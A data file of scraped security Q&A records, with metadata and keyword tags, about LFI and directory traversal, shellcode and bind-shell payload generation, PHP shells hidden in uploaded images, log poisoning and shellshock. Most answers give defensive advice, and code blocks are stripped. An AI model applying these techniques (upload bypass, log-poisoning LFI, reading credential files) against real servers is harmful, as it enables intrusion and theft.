395,basically the difference is that with a file inclusion vulnerability the resource is loaded and  executed  in the context of the current application a directory traversal vulnerability on the other hand only gives you the ability to read the resource  example files     file a is ../../../../configure.php    file b is index.php    there is a difference between being able to traverse up directories to access file a  for example  to read its contents and that of being able to include the contents of file a whether hosted locally or remotely into the page execution of another file  if a directory traversal existed to give the attacker access to file a they should at least not be able to read the content of it however if file b has this line in it  or similar    then it is possible to have the content of file a included in base64 encoding into file b in what is called a local file inclusion attack   that is how i understand the difference to be  the main difference between lfi and directory traversal is as follows   lfi   it has ability to execute file it may be shell code or other local file which exist in the system   directory traversal  it only traversal the files so we can only read it it can t execute files this is type of sensitive information disclosure    path traversal aka dot-dot-slash  this attack also known as the dot-dot-slash attack ../ is usually performed by means of those characters that allow us to move up in the directory tree.by prefacing the sequence with ../ it may be possible to access directories that are hierarchically higher than the one from which we are picking the file   file inclusion  the vulnerabilities for this attack are divided into remote and local depending on where the file to include is located the attack allows you to access files locally/remotely and execute them,2012-02-17 19:11:17,377,11868,i guess the title says it all there seems to be no obvious difference between directory traversal and file inclusion vulnerabilities   but i guess there must be some difference since the www.cvedetails.com use the following categorizations   among these we can notice both  directory traversal  and  file inclusion  so they must be different somehow,0.058355437665782495,22,sse,directory-traversal|web-application,difference between directory traversal and file inclusion,6,attacks|vulnerability|dot dot slash|path traversal|directory traversal|sensitive information,0.6147400736808777

50805,hah i see what you mean but i believe you re making one fundamental mistake you re invoking an interactive shell without binding it  it s like calling an ifconfig command if you want a single command executed then your shell code is perfect however if you want an interactive shell you can t just run sh    simply running sh will cause a shell to be executed it won t give you interactive control over the shell     solution use a shell code generator to make a reverse tcp shell or a bind shell and use that as the payload for your exploit  if you re attempting to do this in metasploit then here s an example command you want    msfpayload is the name of the function windows/shell_bind_tcp is theexploit path   lport is the port on which the remote victim machinewill have the shell accessable   r is for raw output   then we pipe that to msfencode since we need it to be c code to be executable and ithas to be compiled for that architecture  -e denotes the encoding type and architecture to support the eg is for win sp2  -b denotes the bytes you may not use in the shell code eg 00 is a end of string byte  -t is the output type as c code   research a bit more and play around and you ll get it essentially it s much harder to get an interactive shell as compared to executing a static command  once done you can use a program like netcat to connect and use the shell   hope this was the right solution,2012-05-26 14:27:33.9 UTC,423,10767070,i have been experimenting with buffer overflows on a freebsd system as the first experiment i have tried to get the exploited program to start another process /bin/hostname in this case that all worked fine the program printed the hostname and then terminated.after that i tried to make the program spawn a shell i.e executing /bin/sh i assumed that this could be done by simply exchanging the string representing the program to be called when i try this the exploited program simply quits according to gdb it does successfully spawn a new process /bin/sh however no shell is spawned.i then tried my first exploit and moved the /bin/sh file to /bin/hostname still doesn t change anything.my question is now what seems to be different about executing /bin/sh from any other command?  for reference for the shell spawning attempt i used the following shellcode,0.018912529550827423,8,so,assembly|buffer-overflow|security|shellcode,buffer overflow - program terminates after spawning a shell,2,exploit|buffer overflow,0.5223056077957153

3951,let s say you have the file myscript containing the following   if you make this file executable and run it with ./myscript then the kernel will see that the first two bytes are #! which means it s a script-file the kernel will then use the rest of the line as the interpreter and pass the file as its first argument so it runs   and bash reads the file and executes the commands it contains.another way of executing a file without execute bit set is   a dot followed by a space and then the name of file  thus for bash or whatever interpreter your script requires to execute the script it only needs to be able to read the file  so for scripts the execute bit just makes it a bit more convenient to execute it as long as bash is executable you can always run bash with the script file as argument  this can be true not only with scripts like the other examples shown on all answers basically if the software that reads a file have a bug every file is an vector for malicious code execution using a pretty vast range of techniquesoverflow mem corruption arbitraty software execution... examples    exploit.win32.adobereader.k  - this malicious pdf file takes advantage of a vulnerability  cve-2007-5020 on the uri handling of pdf files this vulnerability affects ie7 adobe acrobat and adobe reader on some platforms  zero day quicktime  mvhd  - the specific flaw exists within the  mvhd  atom by providing a malformed version and flags an attacker is able to create controllable memory corruption and trigger an arbitrary write operation by exploiting this an attacker could execute code in the context of the current user  cve-2014-4979    yes something just has to execute it the x flag hints to the shell that it can be directly executed but that doesn t stop other programs from executing it if they know how  for example if you have a file   which is not executable to the shell you can execute it by calling   which tells   explicitly to execute it if you have a non-executable file   you can execute it by calling   i d imagine there s also a way to tell the os to execute a binary elf file but i don t know the command off hand  there are also a whole class of things which don t require you to do anything in particular to make it execute malicious code pdfs and adobe flash files in particular have had some well-known holes which allowed the simple act of reading a file to execute malicious code there are also some files which in specific places and be auto-executed especially on windows also if the file is compressed it may contain a buffer-overflow virus for the decompressor the file also may be even more malicious taking advantage of a yet-unknown bug in the file system or something else really low-level  bottom line the only way to guarantee something won t infect your computer is to never do anything with anything  a file itself may not be dangerous just sitting there but depending on the program the will try to read it it could cause problems as well if the file can be read it can be copied  so it could be copied and renamed into a executable file  so say you are using dos/windows and you have a file something.txt and you copy it to a file called something.bat you can now execute it   if you have say an html file or html content you can load it in your browser and if your browser has a vulnerability in javascript that program can cause harm  in theory if the file is just sitting there it could be still dangerous if by somehow the file allocation table fat for the file system has some issues and is executing a program then due to improper fragmentation it could jump to where your malicious file is and run such code  this type of actions on some operating systems can be done via a buffer overflow   yes you can the classic example for binaries is to use the elf-interpreter as in the example below   or for x86-64 systems   the same goes for shell scripts   these are basic example when we have a new auditor or risk manager or security officer who thinks we need to tidy up things the resolve this is to go the path of selinux on linux systems as it also restricts other escalation paths as others also mentioned,2015-12-30 01:10:10,809,109293,on a posix system is there a possibility for a file which is non-executable and read-only aka with a mode 444 to run malicious code on a machine?  if so can you explain how it would do so,0.027194066749072928,22,sse,malware|unix|virus,is it possible for a file that is non-executable and read-only to run malicious code,11,cve|virus|flaws|malware|exploit|attacks|vulnerability|malicious code|malicious file|buffer overflow|denial of service,0.4970143139362335

561,"the attack you are experiencing is called a  remote file inclusion  rfi technique it s basically the outcome of a vulnerable web application which is being taken advantage of to upload malicious code to spawn a remote shell  you do not need to specifically disable perl you can start identifying the vulnerable application like for example phpbb that the attacker uses then patch or completely remove that application and replace it with an upgraded version  since the box is compromised it is mostly unsafe to just rely with the method above given that they might have already installed a backdoor running on your host if you have a physical access to the server try to bring it down on the network if you do have remote access then just work around with the firewall rules first ensuring access only to your location of origin ip address  one thing you can do is to explicitly deny all incoming traffic from the network layer and specify only traffic for a given or used port tcp/22,80 to ensure that even though they might have installed a backdoor running on a port different from the two it won t bind and spawn a remote shell  removing perl will break all the perl dependent applications running on your host  disabling perl is useless the exploit that can be written in perl can also be written in another language say php which you obviously aren t going to disable  if you take a system that s already very secure as in vulnerabilities are rare and tend to affect only a small part of the system with no direct way of enabling the execution of arbitrary code then it can be worthwhile to disable all methods of scripting this can limit the extent to which some vulnerabilities can be exploited for example if you can only inject a small number of ascii characters writing a machine executable might be a major challenge whereas writing a script would be trivial  against the kind of vulnerability you encountered disabling interpreters wouldn t help the attacker could upload php or machine code you re shooting the messenger  i agree with gilles that disabling perl is not effective security as there are numerous other ways you could be attacked e.g a python script a bash script a php script an executable and that restricting   to certain users groups may have side effects e.g that program that calls a perl script as an ordinary user  however as an aside the straightforward way if you have an application in linux that you want to restrict to certain users you first create a group then add users to that group  the following commands accomplish this in ubuntu creating the perl group and adding user1 user2 user3 to it   now find where perl currently is   which on my system was   find what it s perl s ownership and permissions currently are   on ubuntu by default set to owned by user root and in group root with everyone having read/execute permissions which you should disable for other users unless they are in the perl group   note that an attacker on your system who isn t a member of the perl group if they can get to a terminal could upload their own version of the perl executable or if you didn t remove read access to other users they could have just copied it to some local/tmp directory set the executable bit on it if they can run   and then use that run perl script s off their own executable",2012-06-18 10:18:47,686,16164,one of my server s web accounts got hacked a couple of times each time someone downloaded a perl script via some  phpbb  forum and used the perl script to do whatever they wanted to do mostly connect to  irc  and start  ddos  attacks according to the script s code  i would like to disable perl for most not all as some processes i use are using perl or some specific users  how can i do it properly? i am using  debian,0.027696793002915453,19,sse,backdoor|linux|perl|permissions,disable perl for some/most linux users,7,ddos|attacks|exploit|backdoor|vulnerability|malicious code|remote file inclusion,0.47346580028533936

5541,avoid giving the daemon privileges it doesn t need even for startup this rules out option 1 and 3 it doesn t mean you have to go for option 2 though  first let me recall the basics just in case   run the daemon as a dedicated user that runs this service only  don t allow the daemon to modify its configuration files this means that all configuration files must be owned by a different user support for acl is ubiquitous these days so have root or some other user own the configuration files and use an acl to allow the daemon s user or group to read them   whether there s significant benefit to preventing the daemon to read sensitive configuration files after startup depends on what it uses the sensitive data for and what else it does if these are credentials that the daemon uses only once during startup and then wipes from memory there s a benefit to making it impossible to read them again later if the sensitive data remains in memory there isn t that much benefit but it also depends which is the most likely an exploit that allows memory disclosure but not arbitrary code execution e.g uninitialized memory or bad pointer — although those usually do allow arbitrary code execution or an exploit that allows file disclosure but dot arbitrary code execution e.g bad path sanitization  if you decide that the protection of not allowing the daemon to read the sensitive file after startup is beneficial then let the init system manage the privilege dropping open the configuration file from the supervisor process then drop the associated privilege a supplementary group presumably and pass the file descriptor to the process   or,2017-02-19 05:33:50,541,151688,given a service that needs access to some secrets from a config file to start i can imagine three approaches  1 keep the file readable only by root start the process as root read the config and drop privileges  2 keep the file readable only by daemon user start the process as the daemon user  3 keep the file readable only by root start the process as the daemon user with the cap_dac_read_search capability and drop it after reading the config  my initial analysis of the alternatives  option 1  + if there s a vulnerability an attacker needs to read own process memory to get sensitive data fairly hard?  - more complex due to need for setuid/setgid  - if the software is compromised before dropping privileges it ll run as root  option 2  + simpler to program drop privileges from init script  - if there s a vulnerability an attacker can read sensitive data from disk easy  option 3  + never gives full root access to the process  + if there s a bug an attacker would have to read process memory instead of just a file  - plenty complex  - still gives very broad access to reading files outside the config file like   and similar  are there any other options that should be considered or pros or cons i have missed? are there any good reasons to handle privilege dropping yourself instead of letting the init process handle it,0.025878003696857672,14,sse,hardening|linux|operating-systems|privilege-escalation|privilege-separation,drop privileges after startup or start as unprivileged user,7,attacks|exploit|protection|sanitization|vulnerability|sensitive data|privilege escalation,0.4672051668167114

67875,these tests are run on an unpatched system   the * wildcard is required or perl will replace system call with a fork/exec combination   however   is not a builtin   so lets try overriding built-in echocommand overides the built-in to avoid recursion   so far we showed that   it can override a built-in  and does not  require  a script to be called  even when the first argument is not a script  every call to system is a vector giving privileges of the caller   i think naked system and popen are rotten i think most uses of these don t bother to escape shell meta-characters in user data  i have this invocation when i want to have the shell produce pipelines or use shell built-ins but it still requires fork/exec   the technique gets bash to refer to the arguments of the -c commands $0 being the first such argument or -- can be used as a filler   this test is run on a patched system   showing clearly that this issue is nothing to do with shellshock  while authors of scripts or script-using tools should know to validate user input and should know to validate/clean the environment as it contains user input some parts of the environment can need to be preserved and it can t always be easy to see which they might be  xauthority dbus_session_bus_address xdg_session_desktop ssh_auth_sock are a few and other important environment variables may not yet be invented  it is called environment for a reason the path can maybe be sanitised but the first command issued to system can be surplanted  the sudoedit man page writes   however this will not be true for setuid bash shell scripts unless they refuse to import all bash functions   yes!   the proof that the function exportation of   is a risk alone is pretty simple   can this give rise to an escalation of privilege in combination with a setuid executable...?  you can t have setuid scripts on gnu so let s assume a setuid binary directly calling a bash script note before starting that this is extremely poor design and is  explicitly recommended against by gnu  and again  in the   manual  also note that   will strip the most nefarious environment variables and that it s not possible in gnu/linux to inject code into a setuid process or to get a dump of it unless you re root so environment-based attacks do require a poorly-written setuid binary  shellshock plays absolutely no role in exploiting such setuid binaries if the binary does follow sanity recommendations it will not call any shell script not call system and ensure that all   calls being performed are not influenced by untrusted environment variables it will not be vulnerable to any privilege escalation by design if the setuid binary does not validate untrusted input it will be vulnerable anyway  the reason why you shouldn t system or launch a shell is not because the environment chosen by the untrusted callee would be carried over to the new shell that depends entirely on programming practices but because if you had made any mistake you would allow a  confused deputy  attack with an unlimited scope rather than just allow specific operations the system would just be compromised to a wider extent than in any other scenario  calling a setuid binary with a shellshock-like environment from bash will cause your instance of bash to process the extra bash primitives with  your  privileges not the privileges of the setuid binary called later which should already assume a hostile environment anyway  would such an escalation vector require a script to be called?  shellshock implies that bash is invoked with an environment that is under the control of a principal who has lower privileges that the one invoking bash in the first place  if noone is invoking bash your shellshock payload is useless since it won t be processed just like an openssl exploit doesn t work on microsoft word  are imported functions potentially used at any point by the normal execution path of /bin/sh -c arguments even when the first argument is not a script?  if the argument is a shell script and   points to bash then bash can be exploited however there is strictly no interest whatsoever in doing this since you re using your own privileges to run the command you don t gain any privileges unless assuming a selinux or apparmor setup where you have more privileges by using   than directly calling something such a setup would be broken and not intentional  if the argument is a binary then the binary gets called does microsoft word use functions from a concurrently running firefox? no the same is true here the loader will load the binary s code and run the binary it will not run buggy code from another binary the only scenario where you could change how a binary behaves is via code injection and you can t do code injections on setuid processes  could you simply give an environment variable the same name as the first argument to system?  yes but system does not read an environment variable it executes a command environment variables are just a dictionary of name:string pairs they do not replace every single text that will be used in the future regardless of semantics a program must make explicit use of an environment variable by reading it and deciding to care about it  if so does that mean that every call to system3 by a setuid executable on a system where /bin/sh is bash is a privilege escalation vector?  absolutely not a call to   by a setuid binary is just a poor idea because if there was a vulnerability the consequences would be ridiculously desastrous a call to   on a bash-using os changes nothing to the fact that privilege escalations require two principals shellshock would cause a privilege escalation only when a higher privileged principal decides to call bash with an unverified environment provided by a lower privileged principal  in most cases such a system call would already be undesirable because there are several non-shellshock ways in which such a set up could turn awry and the precautions to take to avoid existing confused deputy attacks would prevent shellshock as well  if your setu|gid binary preserves its real [ug]id the answer is no  when e[ug]id != real [ug]id and not invoked in privileged mode   bash drops its privileges  bash     when running in privileged mode or when bash is patched to not drop privileges when called as /bin/sh e.g  debian has such a patch  to avoid breaking old set[ug]id programs such as uucp bash doesn t import functions from the environment bash checks if it is running set[ug]id or in privileged mode   and doesn t import functions from the environment if so   bash     bash,2014-09-29 11:07:14,1351,68558,even without the immediate code-execution problem of  shellshock  trailing commands to what extent does the feature of bash importing functions from the environment give rise to a comprehensive privilege escalation vulnerability?   to be clear there are many setuid programs and some of them will directly or indirectly call scripts or use the   call which on most linuxes goes through   the question is to what extent  assuming systems have such   binaries installed  this feature of   allows local privilege escalation   for example if calling a script does it allow overriding of built-ins? if so can this give rise to an escalation of privilege in combination with a   executable and the   call by overriding e.g     or something innocuous?  would such an escalation vector  require  a script to be called in which case one could potentially override   or any command used by the script which didn t use a full path?   are imported functions potentially used at any point by the normal execution path of   even when the first argument is not a script?   could you simply give an environment variable the same name as the first argument to  ?  if so does that mean that every call to   by a setuid executable on a system where   is bash is a privilege escalation vector,0.01924500370096225,26,sse,bash|privilege-escalation|shellshock,does the bash shell function import feature inevitably give rise to privilege escalation problem,8,attacks|exploit|sanitization|vulnerability|code injection|confused deputy|untrusted inputs|privilege escalation,0.4464021623134613

  now the 2nd part for protecting from such attacks well i could not find yet a reliable solution which would work with most cmss and not involve denying directory listings still looking..  you can encode web shells into a png image if you make it right it will be able to survive the re-encoding as well   have a  look at this   re encoding the image will not stop someone from uploading a shell the only sure way to prevent it is to re-encode and scan the image for the presence of php tags  for an example of a  php png shell that will survive re-encoding   if you only use the gd functions for manipulating the images you should be ok to be on the safe side you may convert all incoming images to a specific format that you may consider safe  i like png or jpg depending if the output intent is display-in-browser or some kind of hi-quality-print also never use the imoage name supplied by the user on your own filesystem this way it wont be able to put weird data in the filename.to be even safer you may use the command-line imagemagik conversion utility this is both faster and safer  a brilliant solution just came to my mind if you store your images on the separate server/domain/cdn/whatever has no direct access to your code you have your mission accomplished!  there are some methods to protect yourself from such tricks check them out  here   also read   this   article which explains the attack and ways to tackle it  the main point stressed in these is the use of  basename  function of php to defer such attacks  i know there s a way or was a way to save a php file as a   and have it run the code in an exploit i saw on the download page the mime type was set as a gif and the the image was loaded with something to the effect of   when   was actually a php file renamed as   including the file would execute the php payload otherwise the file was just a normal gif i saw this exploit for an upload script the hacker also hex edited   so that the bytes   preceded the rest of the file those bytes are a gif header and would trick php into thinking the file was a gif allowing the php file to be uploaded bypassing the  advance  file type checking this could easily be fixed by building better file checking that made sure the entire file was legit the easiest way i can think of would be to try to load the image with gd and see if it has an error i don t think gd would execute the php payload but i m not sure you would have to test i assume nearly the same exploit was done or could be done for a tiff or any file type  in order to make sure your script is not exploited i would take these steps  1 set a few file types that you can do   if its not in the array do not allow it even if you disallow   there s still   etc that work on some servers  2 gaard against   by saving the uploaded file to a md5 or a rand name of the file name with the exclusion of the file type so   would become    3 check integrity of file make sure both the header and the rest of the file is legit  4 do not use   instead print it s content  yes it would need to be loaded probably by a user-supplied variable in an include path e.g   they could also have allowed the user to set the whole filename with a .php extension so all they d need to do is load it in a browser  check that   doesn t return false use a random filename and enforce the file extension if at all possible don t store the uploaded image in a web-accessible location as it could also contain js and therefore be an xss vector  re-encoding the image can also let you strip nasty metadata and junk at the end which is permitted by several formats e.g jpeg,2011-02-24 08:15:21.46 UTC,1132,5101993,i remember seeing an exploit for an image uploading function which consisted of hiding malicious php code inside a tiff image  i m making my own image uploading script and i assume i ll have to protect myself from this possibility except that i have no idea how it would work does anyone know how a php shell hidden inside an image would execute itself? would it need to be loaded in a certain way?  thanks,0.0176678445229682,20,so,code-injection|php,can a php shell be injected into an image? how would this work,7,bypass|exploit|attacks|protection|code injection|buffer overrun|cross site scripting,0.4449729323387146

4458,uploading a virus won t infect something interpreting the virus in the interpreter the virus was meant to exploit will i.e acrobat opening a pdf the os launching an x86_64 binary etc this is something to think about when you evaluate your threat model  the importance of extensions  file extensions are only  hints  to handling instructions only windows has such a strong relationship between the file s extension and the identity of the file  there are two different issues here    the file is a virus they can be named   or   - it doesn t matter what matters is    the file is interpreted by the interpreter the virus is meant to exploit this means somebody opens a tainted pdf file with acrobat or a tainted executable file by running it - after possibly renaming it     sidenote interpreted using the interpreter the virus is meant to exploit is not a typo it is a pedantic explanation for example the processor is not an application but it is an interpreter and it can be exploited   if somebody uploads   and you replace the extension with   somebody s computer may go hey that s not a png but it  does  look like an executable and executes it anyway that didn t help  if somebody uploads   the same thing can happen  obviously it  is  obviously more likely for somebody s computer to interpret a   as an executable than it is for it to interpret   as an executable so there is some validity to this however simply renaming things doesn t change very much - it only pisses people off later when they get a  corrupted  png file  what should you do?   my suggestion  have your server run some [trusted] program on every image uploaded and tell that to convert it to a png or a jpg if it fails to do so then the uploads weren t images if it succeeds you also managed to remove any viruses which may have been  hidden in the same file   another suggestion which is easier to do immediately but is really more of a first-pass risk  mitigation  technique reject uploads which don t end in png or jpg -  don t  just rename them,2016-05-08 02:55:39,496,122608,ok so i have my own website and you can use the file upload quite a bit and it is very important to the site however i ve been hearing that clients can still bypass a file extension restrictions i only allow png and jpg and then they can inject malware into the site  so i was thinking of a way to prevent this however i m not sure if it would fully work so i was thinking that after a file is uploaded i by default set the extension to a png  would this stop any code from being executed if there was an upload of a file with malware that bypassed the extension filter,0.034274193548387094,17,sse,file-upload|malware|web-application,preventing uploads of malware to server by changing all extentions to png,4,virus|bypass|malware|exploit,0.44405680894851685

8153,putting the file into a folder into your document root folder may not present a direct risk as long as you have your permissions properly set however in case of an attack which comes locally i.e lfi this means the attacker would be able to either abuse your script locally and read sensitive  information regardless of any acl placed or write to a file which is executable on the server using a server-side scripting language like php or asp   imagine the following scenario  you have a folder for storing sensitive data in your document root /var/www/html/sensitivedata and at the same time you have restricted access to this folder using an .htaccess file  index.php is prone to local file inclusion using the following approach:index.php?p=filename even if you use specific extensions there are ways to bypass this but this is out of scope  then an attacker would be able to read your file by accessing the following url  http://domain.com/index.php?p=sensitivedata/filename.txt   of course the same thing could happen if the directory  sensitivedata  is outside of the document root however exposing it publicly defines an additional attack vector as it is clear to the attacker that the directory exists   a question that may arise is how would an attacker know that filename.txt exists? this can be done either by bruteforcing or by enumerating the filesystem using any other means the attacker may have found  in case the attacker found a way to write files to the system he could write an executable script to /var/www/html/sensitivedata/randomscript.php and then execute it by just visiting  https://domain/sensitivedata/randomscript.php  which would give provide him with local access to the system and the ability to execute commands called rce or remote command execution   now having in mind the above scenario in case your folder is outside of your document root the attacker wouldn t be able to execute the script he uploaded   an acl using htaccess wouldn t present a vulnerability itself but raises a risk in case the attacker found a way to access the filesystem using a vulnerable web script or by any other means   any sensitive data or a folder used as a container to store files especially when they are being uploaded by the user should be outside of document root and handled with caution if you need to provide any authenticated users access to read them you should implement a script handling the process instead of providing them with a direct access to your folder/file   i think that by including it in the webroot you may leave yourself vulnerable to some bypass if you do not write the   correctly   if you keep important files outside the webroot in a directory such as /opt or   there s no way they will be able to access that data without a local file inclusion vulnerability as apache or nginx whatever you re using to serve the application will not allow them to traverse up into the     directories,2019-08-03 19:48:06,588,214620,let s say i create a website with apache for example and my php pages get some sensitive information from a file on disk a .ini file a sqlite db or whatever  i thought two ways to prevent users from getting to this information    separate document folder   and data folder   where to put these sensitive files    put sensitive files inside the document root folder   and prevent them access with   files    is there a noticeable security risk with using one method or another? or are they equivalent,0.034013605442176874,20,sse,apache|htaccess|html,is there any good reason to move files outside webserver document root,5,bypass|attacks|vulnerability|sensitive data|sensitive information,0.4405158758163452

64703,i would consider these two different vulnerabilities  storing a file in the remote server  and the  local file inclusion  which would read/execute it each of them can be sufficiently bad on their own  a lfi vulnerability typically allows you reading files to which you shouldn t had access for instance a path traversal vulnerability in a comment system could allow reading instead the configuration of the web application and allow access to keys used by the application like the database credentials you can t change the file permissions so that the web application can t read it since the application needs reading it it just shouldn t show the contents to the user  another typical case would be that the application allows uploading images and you can then include the uploaded image as a php file the file was created by the web application so it will be the file owner and have access to the file  if the webapp runs under a different uid than your webserver  you could remove the read permission from the owner and leave it for others so that it can be shown to the user still the application may nevertheless need to read the uploaded image later such as for generating a thumbnail  as for storing files it should be clear that if you are able to upload a file in the right place eg a file with a script extension in a folder server by the web server it could be executed without a lfi vulnerability,2018-11-28 03:08:34,452,198573,"i m trying to understand how to perform a  lfi  specifically php lfi and there is a aspect of this attack that seems to be never discussed in online articles i read the injected file  permissions    indeed let s assume i can inject a file in the system most of the time it is not gonna be word readable or executable even the directory might not be traversable therefore even if i can traverse a path though a   it won t get executed   what i m trying to say is that according to me if a system running php is well configured and assign the right permissions to files there is no need to worry that much about files extensions files content .. so instead of adding multiple checks on the file injected as suggested on multiple online resources shouldn t the dev focus on the system configuration allow_url_include=0 file permissions,... ? for me it is comparable to sql injections you would rather use prepare statements and simple user input checking than vulnerable queries and complex user input checking with huge whitelists/blacklists  am i missing something ",0.022123893805309734,10,sse,exploit|lfi|permissions|php|vulnerability,php lfi fix with the right file permissions,5,exploit|attacks|vulnerability|sql injection|path traversal,0.4392573833465576

4177,directory traversal is a rather broad vulnerability that can lead to a variety of attacks depending on context   on its own it only means that an attacker supplies a file or directory name and can travers to files or directories outside of the expected directory this can facilitate attacks such as   lfi  reading of files outside of the desired directory  uploading files outside of the desired directory possibly leading to code execution for example if the only thing preventing code execution is securing the desired directory  moving files outside of the desired directory  viewing directories outside of the desired directory which may help an attacker gather information about the target system  etc   giving your files complicated filenames could only possibly help in the case of reading out files outside of the directory and only if you do not provide the ability to list files   renaming your files may seem like a good idea as defense in depth - security by obscurity should never be your only line of defense - but it s not really worth it as there are larger attack surfaces than reading out your php files  in the case of lfi an attacker can still read out system files which can have severe consequences depending on your configuration they may be able to   read out /etc/shadow crack the passwords and gain access to the system  inject code into various log files and include them leading to code execution  inject code into proc/self/environ and include it leading to code execution  etc   so renaming files may prevent an attacker from reading out those specific files but doesn t really limit the damage of lfi it also leads to reduced maintainability making it not worth the trouble  having to know the file name depends upon the vulnerable code sometimes you can get directory listings however there are lots of other files an attacker would look at rather than your php files such as     if your directory traversal is used in an   statement you have a   or   vulnerability and again there are easier targets such as setting the user-agent to   and traversing to   or your web server logs or any other location where the attacker can control content written on your hard drive uploaded files temporary files session files database files smtpd/sshd logs etc etc should an attacker succeed with exploitation of lfi your file name complexity no longer matters as an attacker could just run commands like   to list files  a good way to prevent traversal attacks is to compare the user supplied data against an array of acceptable values or simply call   on the user supplied data prior ot the   as long as there is no user attacker controlled files in the same directory,2016-02-28 19:11:11,511,115995,if my websites has a directory traversal vulnerability linux and my other php pages have complicated filenames e.g efj93ehdsijgdij3g.php could an attacker still access other files? or an attacker strictly needs the right filename in order to successfuly conduct a directory traversal,0.050880626223091974,26,sse,directory-traversal|web-application,do you need to know the filename to conduct a directory traversal,5,attacks|exploit|vulnerability|attack surface|directory traversal,0.4377889633178711

11875,running the script would require remote access to the server either directly or by exploiting some bug in the website code similar to sql injection the risk here is mostly in hosting malware especially if you allow user uploads to be downloaded by other users while getting malware onto a machine is not as simple as just renaming an executable to another file type it still has to be run as an executable rather than an excel spreadsheet for instance to be able to function it is possible to embed malware in various types of files such that the act of opening that file causes execution of the malware in that sense you really can t tell at a glance whether a file is malware or not it could look like an excel file even open up properly in excel but still wreck havoc the only way to be safe is scan all user uploaded files with a good antimalware application  as far as running something remotely goes though the access to the server required to run the script would provide a much better avenue for mischief that your upload form anyways so anyone who could manage that kind of access isn t going to be trying to exploit you through your upload form and anyone who uploads something malicious without that access can t really do anything  one of the things that you should definitely do is to remove iis handlers permissions from running scripts otherwise anybody can upload a .asp or a .aspx or any other script engine file and then execute it by requesting it one simple way to test that is just create a test.asp file with &lt;%= now > and if that returns you the date then anybody can upload scripts and run them in your server  the way to disable that in iis 7+ would be to add a configuration file in a parent directory and edit the permission for handlers for example assuming a child folder called public you can drop the following web.config to disable that   you can test then that it should no longer execute the file and instead block it if you want to allow download of them then you ll need to configure the static file handler and request filtering to handle everything instead but make sure you do that for that folder only since you don t want people downloading your source code,2015-09-22 14:46:52.527 UTC,593,32720036,we have to fix some security vulnerability in our system and one of the items is to disable execution of uploaded scripts/exe s through file upload control  we have excel upload facility lets say hypothetically hacker changes the .exe to .xls and uploads it there are ways to block that but ignore that for now also assume that    the upload folder is within pubilc directory from where the website is installed in iis or  someone can access that file by specifying a full path of file thru some api endpoint of which hacker is aware of   now given that there is an exe or a script which is accessible to the hacker through above means is it possible for hacker to run that script/exe in someway so that it can cause harm to the server where the site is hosted?  i am not really security expert hence cant think ways how that can be possible? how a hacker can remotely run exe/script on server given that they does not have any access to the server,0.016863406408094434,10,so,asp.net-mvc-4|iis|security,executing a script uploaded through file upload in public folder,4,exploit|antimalware|vulnerability|sql injection,0.4324690103530884

2507,a piece of malware embedded into a file typically contains an exploit and a payload the exploit is the characteristics that will cause programs that use this file to execute the payload in contract a virus that is itself a binary does not need an exploit but just needs you to run it and its contents essentially is the payload to keep it simple an exploit causes non-malicious code to behave erratically and execute the payload instead of the normal code  binary case  the binary needs to be executed to cause harm i don t know of any reasons why a compressed binary would be automatically uncompressed and executed the simple presence of the compressed version should cause no harm  image case  an exploit hidden in a crafted image typically targets an image viewer more precisely it targets a very precise image viewer usually of a certain version once the vulnerability being exploited has been discovered and the image viewer updated by the user it is no longer vulnerable to opening the malicious image a compressed version of this image is unreadable to the image viewer because it is not the right format the vulnerable code inside the viewer will not process the data that contains the exploit the compressed image contains a compressed exploit and a compressed payload the programs that you will use will not be the ones vulnerable to the uncompressed exploit  there is an exception however the exploit within the image could be targeting the compression app itself in which case the fact of trying to compress the image with the specific vulnerable app will cause the payload to be executed  and another exception some programs your archive extraction program your file manager etc. might attempt to offer previews of the content of an archive they might look into the archive by decompressing it detect that there is an image and decide to display it if the code that is used to display the image is the one that is vulnerable to the original exploit then the payload will be executed  to summarise normally a compressed file with a compressed exploit does not cause vulnerabilities since the exploit is no longer processed by the code it targets however there could be reasons for the archive to be automatically uncompressed and its contents processed in which case you would be vulnerable  to avoid such issues i would personally prefix the malware by a sequence of bits of my choosing to ensure that no program on my system recognises what the file is and decides to poke it in any way as far as i remember the quarantine function of antiviruses does something similar  probably not but it isn t a guarantee  viruses are just computer programs  they have to be executed by something in most cases simply copying the uncompressed files of a virus is not enough to infect your computer either and generally speaking compressing one is going to result in making it impossible for it to execute without being uncompressed first    a clever virus however could try to identify vulnerabilities in one of the major compression engines and design itself such that when it is compressed it could take over the compression library itself  now that depends on their being problems in the compression library to be exploited but you can t be sure such vulnerabilities don t exist either  is it particularly likely for you to encounter such a virus probably not but you also don t know what other viewers might do when they look at the contents of the compressed file either  it s a pretty minimal risk but it isn t necessarily impossible to write something that could escape from it,2014-09-29 15:36:59,715,68580,let s say you have a piece of malware either as a standalone binary or hidden within a crafted image two distinct cases   if i compress the standalone binary can its mere presence as a compressed binary cause harm to my system? if so how?  if i compress the malicious image can its mere presence as a file or the fact of using it as a compressed file but not the uncompressed version cause harm to my system? if so how,0.05174825174825175,37,sse,compression|malware|virus,can an compressed virus still do any harm to an os,5,virus|malware|exploit|vulnerability|malicious code,0.42795830965042114

23734,you can follow the directions in the owasp security topic about unrestricted file uploads at  https://www.owasp.org/index.php/unrestricted_file_upload   in general the best practice is to store the files with a internal and secure file name and store the real name in a database or another data source associated to that file  also it helps when the file name contains characters that are incompatible with the target filesystem    if you don t need to track the file name of the uploaded file then you can rename the file after uploading using another secure name  some examples of distinct problems associated with file uploads are       attacks on application platform       upload .gif file to be resized - image library flaw exploited      upload huge files - file space denial of service      upload file using malicious path or name - overwrite a critical file      upload file containing personal data - other users access it      upload file containing tags - tags get executed as part of being  included in  a web page      upload .rar file to be scanned by antivirus - command executed on a  server  running the vulnerable antivirus software       attacks on other systems       upload .exe file into web tree - victims download trojaned executable      upload virus infected file - victims  machines infected      upload .html file containing script - victim experiences cross-site  scripting xss      upload .jpg file containing a flash object - victim experiences  cross-site content hijacking      upload .rar file to be scanned by antivirus - command executed on a  client running the vulnerable antivirus software   every potential vulnerability you expose yourself to when dealing with uploaded files is determined by what you do with the file  if you can let users upload files which you store as-is for other users to download then one user can upload a virus-infected executable that will ruin another user s system  if you let users upload files to any hosted directory because they can provide a target filename and/or directory they can upload a file that gets interpreted and/or executed by the web server by issuing a request to the file .php .aspx ... this way a malicious user can execute their code on your server doing whatever their evil heart desires  if you let users upload an image and then resize it through some library then your server is vulnerable to the exploits that exist in that version of that library a malicious user can then for example inject executable code in an exif tag if some image processor library is known to be vulnerable to that  if you read a 